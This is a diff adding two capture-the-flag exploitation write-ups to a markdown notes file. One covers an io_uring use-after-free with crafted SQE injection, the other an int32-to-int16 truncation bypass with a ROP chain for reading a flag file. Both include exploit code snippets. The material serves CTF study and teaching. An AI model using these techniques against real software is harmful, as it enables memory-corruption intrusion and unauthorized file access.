@@ -36,6 +36,8 @@
 - [1-Byte Overflow via 8-bit Loop Counter (srdnlenCTF 2026)](#1-byte-overflow-via-8-bit-loop-counter-srdnlenctf-2026)
 - [Bytecode Validator Bypass via Self-Modification (srdnlenCTF 2026)](#bytecode-validator-bypass-via-self-modification-srdnlenctf-2026)
 - [Classic Heap Unlink Attack (Crypto-Cat)](#classic-heap-unlink-attack-crypto-cat)
+- [io_uring UAF with SQE Injection (ApoorvCTF 2026)](#io_uring-uaf-with-sqe-injection-apoorvctf-2026)
+- [Integer Truncation Bypass int32→int16 (ApoorvCTF 2026)](#integer-truncation-bypass-int32int16-apoorvctf-2026)
 - [Kernel Exploitation](#kernel-exploitation) (basic; see [kernel.md](kernel.md) for full coverage)
 
 ---
@@ -960,6 +962,75 @@ For comprehensive kernel exploitation techniques, see [kernel.md](kernel.md). Qu
 - Check kernel config for disabled protections:
   - `CONFIG_SLAB_FREELIST_RANDOM=n` → sequential heap chunks
   - `CONFIG_SLAB_MERGE_DEFAULT=n` → predictable allocations
+
+---
+
+## io_uring UAF with SQE Injection (ApoorvCTF 2026)
+
+**Pattern (Abyss):** Multi-threaded binary with custom slab allocator and io_uring worker thread. A FLUSH operation frees objects but preserves dangling pointers, creating UAF. Type confusion between freed/reallocated objects enables injection of io_uring SQE (Submission Queue Entry) structures.
+
+**Exploitation chain:**
+1. Exhaust both slab allocators (fill all slots)
+2. Leak PIE base from STATUS response
+3. FLUSH frees objects (UAF — pointers remain valid)
+4. Allocate different type into freed slots (type confusion via exhausted secondary slab falling back to primary)
+5. Write crafted io_uring SQE into reused memory
+6. Worker thread submits SQE as-is → `IORING_OP_OPENAT` opens flag file
+
+**io_uring SQE structure for file read:**
+```python
+import struct
+
+def craft_sqe(pie_base, flag_path_offset=0x6010):
+    sqe = bytearray(64)
+    struct.pack_into('B', sqe, 0, 0x12)       # opcode = IORING_OP_OPENAT
+    struct.pack_into('i', sqe, 4, -100)        # fd = AT_FDCWD
+    struct.pack_into('Q', sqe, 16, pie_base + flag_path_offset)  # addr = "/flag.txt"
+    return bytes(sqe)
+```
+
+**Key insight:** io_uring's kernel-side processing trusts SQE contents from userland shared memory. If an attacker controls the SQE buffer via UAF/type confusion, arbitrary kernel operations (file open, read, write) execute without syscall filtering. XOR-encoded slab freelists add complexity but don't prevent logical UAF when FLUSH clears objects without NULLing all references.
+
+**Detection:** Binary uses `io_uring_setup`/`io_uring_enter` syscalls, custom allocator with FLUSH/cleanup operations, multiple threads sharing memory.
+
+---
+
+## Integer Truncation Bypass int32→int16 (ApoorvCTF 2026)
+
+**Pattern (Archive):** Input validated as int32 (>= 0), then cast to int16_t for bounds check (<= 3). Values 65534-65535 pass the int32 check but become -2/-1 as int16_t, enabling OOB array access.
+
+```python
+# Value 65534: int32=65534 (passes >= 0), int16=-2 (passes <= 3)
+# ring_array[-2] reads 16 bytes before array → leaks GOT/PIE pointers
+payload = str(65534).encode()  # Sends as positive int, server casts to int16
+```
+
+**Dynamic fd capture via `xchg rdi, rax`:**
+
+In Docker/socat environments, `open()` may return fd 4+ instead of 3 (extra inherited fds). Hardcoding fd=3 in ORW ROP chains fails.
+
+```python
+# Standard ORW fails in Docker:
+# open("/flag.txt") → fd=5 (not 3!)
+# read(3, buf, size) → reads wrong fd
+
+# Fix: xchg rdi, rax captures open()'s return value dynamically
+rop = ROP(libc)
+rop.raw(pop_rdi)
+rop.raw(flag_str_addr)
+rop.raw(pop_rsi)
+rop.raw(0)  # O_RDONLY
+rop.raw(libc.sym.open)
+rop.raw(libc_base + 0x181fe1)  # xchg rdi, rax; cld; ret
+# rdi now holds actual fd from open()
+rop.raw(pop_rsi)
+rop.raw(buf_addr)
+rop.raw(pop_rdx_xor_eax)  # pop rdx; xor eax, eax; ret (dual-purpose!)
+rop.raw(0x100)  # rdx = size, eax = 0 (SYS_read)
+rop.raw(libc.sym.read)  # read(actual_fd, buf, 0x100)
+```
+
+**Key insight:** `xchg rdi, rax; cld; ret` is the critical gadget for containerized ORW — it passes `open()`'s actual return value to `read()` without hardcoding the fd number. The `pop rdx; xor eax, eax; ret` gadget serves double duty: sets rdx for read size AND clears eax to 0 (SYS_read syscall number).
 
 ---
 
